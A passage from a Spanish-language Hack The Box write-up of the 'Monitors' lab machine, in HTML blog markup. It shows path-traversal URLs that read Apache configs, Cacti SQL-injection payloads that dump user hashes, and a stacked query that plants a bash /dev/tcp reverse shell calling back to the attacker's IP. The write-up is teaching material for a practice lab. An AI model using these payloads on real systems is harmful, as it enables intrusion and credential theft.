+&lt;p&gt;Ya sea porque intuimos que puede haber configuraciones adicionales o porque revisamos minuciosamente los archivos de configuración de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, encontramos pistas sobre la posible existencia de dominios adicionales. Por ejemplo, en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports.conf&lt;/code&gt; se menciona que cualquier cambio de puerto o adición de puertos puede requerir ajustes en la declaración &lt;em&gt;VirtualHost&lt;/em&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/code&gt;. Esto nos recuerda que el servidor está aplicando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; desde el inicio, lo que podría indicar la presencia de dominios que aún desconocemos.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al examinar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000-default.conf&lt;/code&gt;, descubrimos que el servidor, en efecto, aloja un segundo dominio. También notamos que esta configuración es la que se usa para el acceso predeterminado cuando no se aplica un dominio específico, mostrando el mismo mensaje que vimos al intentar acceder por IP, en el cual se nos indica que el acceso directo está restringido.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/000-default.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt; organiza la configuración de sitios virtuales en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-available/&lt;/code&gt;, aquí es donde buscamos los archivos &lt;em&gt;.conf&lt;/em&gt; que definen cada dominio. Al revisar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitors.htb.conf&lt;/code&gt;, vemos que el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitors.htb&lt;/code&gt; tiene configurada su raíz en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/wordpress&lt;/code&gt;, tal como asumimos inicialmente al identificar el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/monitors.htb.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por otro lado, al inspeccionar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-admin.monitors.htb.conf&lt;/code&gt;, descubrimos que el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-admin.monitors.htb&lt;/code&gt; tiene su contenido ubicado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esta información y sabiendo de la existencia de este segundo dominio, podemos añadirlo también al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y explorar de que se trata.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al llegar a este segundo dominio, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-admin.monitors.htb&lt;/code&gt;, nos encontramos con un panel de inicio de sesión en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt; es una herramienta de monitoreo de redes que permite la recopilación y graficación de datos de rendimiento en redes. Podemos probar con las credenciales que obtuvimos previamente en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt;, y vemos que funcionan, lo cual demuestra otra mala práctica de seguridad: la reutilización de credenciales.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro, notamos que estamos ante la versión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.2.12&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt;, lo cual nos lleva a investigar si esta versión tiene vulnerabilidades conocidas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para verificarlo, podemos hacer una búsqueda en línea, en &lt;em&gt;Exploit Database&lt;/em&gt;, o directamente desde la consola con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit cacti 1.2.12
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta búsqueda revela una vulnerabilidad de &lt;a href=&quot;https://mateonitro550.github.io/SQL-Injection&quot;&gt;inyección SQL&lt;/a&gt; en uno de los parámetros de la aplicación. Aunque podríamos ejecutar el exploit tal como está, resulta más valioso entender su funcionamiento para practicar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyecciones SQL&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para acceder, en la interfaz de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt;, vamos al menú izquierdo, en la sección &lt;em&gt;Presets&lt;/em&gt;, donde se encuentra la opción &lt;em&gt;Color&lt;/em&gt;. Aquí se despliega una tabla con diversas configuraciones de colores. La vulnerabilidad se explota usando el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter&lt;/code&gt;, al que podemos inyectar comandos SQL para manipular las consultas a la base de datos en la URL que aparece a continuación:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Comenzaremos inyectando el payload clásico &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;)+UNION+SELECT+NULL;--+-&lt;/code&gt; para calcular el número de columnas en la consulta.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Continuaremos añadiendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; hasta encontrar la cantidad correcta de columnas, y al añadir siete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;, logramos que se descargue un archivo &lt;em&gt;CSV&lt;/em&gt; llamado &lt;em&gt;colors.csv&lt;/em&gt;. Esto confirma que la consulta SQL original tiene siete columnas.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora queremos listar todas las tablas en la base de datos, utilizando el payload que aparece a continuación:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre las tablas listadas, identificamos una de interés llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_auth&lt;/code&gt;. Procedemos a descubrir el nombre de sus columnas mediante la siguiente inyección:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL,column_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name=&apos;user_auth&apos;;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre las columnas, nos interesan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;. Usando la siguiente inyección, listaremos los valores de estas columnas:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL,username,password,NULL,NULL,NULL,NULL+from+user_auth;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esto nos revela dos usuarios: &lt;em&gt;admin&lt;/em&gt; y &lt;em&gt;guest&lt;/em&gt;, aunque sus contraseñas están hasheadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sin embargo, existe una segunda inyección que nos permite obtener una &lt;em&gt;reverse shell&lt;/em&gt; dentro de la máquina. Esta inyección se realiza de la siguiente manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UPDATE+settings+SET+value=&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/443 0&amp;gt;&amp;amp;1;&apos;+WHERE+name=&apos;path_php_binary&apos;;--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto, modificamos un valor dentro de la configuración de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt; para que ejecute nuestro comando de &lt;em&gt;reverse shell&lt;/em&gt;. Para activarlo, accedemos a la URL que aparece a continuación:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al hacerlo, logramos establecer la &lt;em&gt;reverse shell&lt;/em&gt;, obteniendo acceso directo dentro de la máquina.&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro de la máquina, podemos confirmar nuestra presencia en el sistema mediante el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hostname -I
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esto nos muestra una lista de direcciones IP disponibles en la máquina, incluyendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.238&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.1&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.1&lt;/code&gt;. Aunque estamos efectivamente en la máquina víctima, la presencia de direcciones en el rango &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.0.0/12&lt;/code&gt; sugiere configuraciones de red asociadas con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt;, ya que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; típicamente asigna direcciones IP en este rango para redes internas de contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para verificar si &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; está activo en la máquina, podemos revisar si existe el socket de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; ejecutando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -l /var/run/docker.sock
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esto muestra que el socket es propiedad del usuario &lt;em&gt;root&lt;/em&gt; y del grupo &lt;em&gt;docker&lt;/em&gt;, lo cual indica que el acceso al &lt;em&gt;daemon Docker&lt;/em&gt; está restringido a estos usuarios y a los miembros del grupo &lt;em&gt;docker&lt;/em&gt;. Esto significa que nuestro usuario actual no tiene permisos para interactuar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; directamente, por lo que comandos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker info&lt;/code&gt; no serán efectivos.&lt;/p&gt;
+
+&lt;p&gt;Otra opción para confirmar que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; está en ejecución es inspeccionar los procesos activos con:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps aux | grep dockerd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este comando muestra que el proceso &lt;em&gt;dockerd&lt;/em&gt; (el daemon de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt;) está en ejecución, lo cual confirma que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; está activo en el sistema.&lt;/p&gt;
+
+&lt;p&gt;El hecho de que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; esté corriendo en la máquina víctima es relevante, ya que podría abrir nuevas oportunidades para la escalada de privilegios o la explotación del sistema. Si encontramos algún contenedor en ejecución que esté mal configurado o que ejecute servicios con permisos elevados, podríamos aprovechar esta vulnerabilidad para obtener privilegios adicionales o incluso interactuar con los recursos de la máquina anfitriona desde dentro de un contenedor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/41.png&quot; alt=&quot;41&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A partir de aquí, continuamos explorando la máquina. En el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt;, encontramos que existe un usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt;. Si accedemos a su directorio personal, encontramos la primera flag, y un archivo note.txt; sin embargo, ambos están protegidos para ser leídos solo por el propio usuario. Esto sugiere que eventualmente necesitaremos convertirnos en el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt; para obtener acceso a la flag y ver de qué se trata esta nota.&lt;/p&gt;
+
+&lt;p&gt;Además, descubrimos que en su directorio personal existe un directorio oculto llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.backup&lt;/code&gt;, lo cual nos llama la atención. Los directorios de backup suelen contener copias de seguridad que podrían incluir información sensible, como credenciales de acceso o configuraciones importantes. Sin embargo, no podemos leer directamente este directorio, ya que solo tenemos permisos de ejecución (traverse), lo que significa que podemos navegar dentro de él, pero no podemos listar ni inspeccionar su contenido, y solo podremos acceder a los archivos cuyo nombre conozcamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/42.png&quot; alt=&quot;42&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/43.png&quot; alt=&quot;43&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El hecho de que exista un mecanismo de backup en la máquina nos lleva a investigar más a fondo, por lo que realizamos una búsqueda recursiva en el sistema para buscar archivos relacionados con backup:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find /etc /home /lib /opt /tmp /usr /var -type f -iname &apos;*backup*&apos; 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En los resultados encontramos un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-backup-service&lt;/code&gt;, que resulta interesante ya que está relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt;, el sistema que habíamos visto previamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/44.png&quot; alt=&quot;44&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Este archivo define un servicio que se ejecuta con el usuario &lt;em&gt;www-data&lt;/em&gt; y llama al script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt;, ubicado en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.backup&lt;/code&gt; dentro del directorio personal de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/45.png&quot; alt=&quot;45&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al revisar el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt;, vemos que el script comprime los archivos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt; en un archivo ZIP, que luego transfiere a una ubicación remota utilizando &lt;em&gt;SSH&lt;/em&gt;. El script proporciona una contraseña para autenticarse, con la cual intentaremos conectarnos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt; y obtener acceso directo a su cuenta.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/46.png&quot; alt=&quot;46&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh marcus@10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De esta manera, obtenemos acceso a la cuenta de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt; y podemos finalmente leer la primera flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/47.png&quot; alt=&quot;47&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
+
+&lt;p&gt;Una vez dentro como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marcus&lt;/code&gt;, podemos leer la nota que habíamos encontrado anteriormente. En ella se hace alusión a la actualización de la imagen de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; para su uso en producción, lo que confirma la existencia de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt;, algo que ya habíamos corroborado previamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/48.png&quot; alt=&quot;48&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Después de explorar un poco más la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con &lt;em&gt;Nmap&lt;/em&gt;. Estos puertos, conocidos como &lt;em&gt;puertos internos&lt;/em&gt;, están disponibles solo localmente. Los puertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt; (HTTPS), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3306&lt;/code&gt; (MySQL) y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;53&lt;/code&gt; (DNS) están escuchando en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; y no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con &lt;em&gt;Nmap&lt;/em&gt; y están disponibles para conexiones externas.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -nlpt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/49.png&quot; alt=&quot;49&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
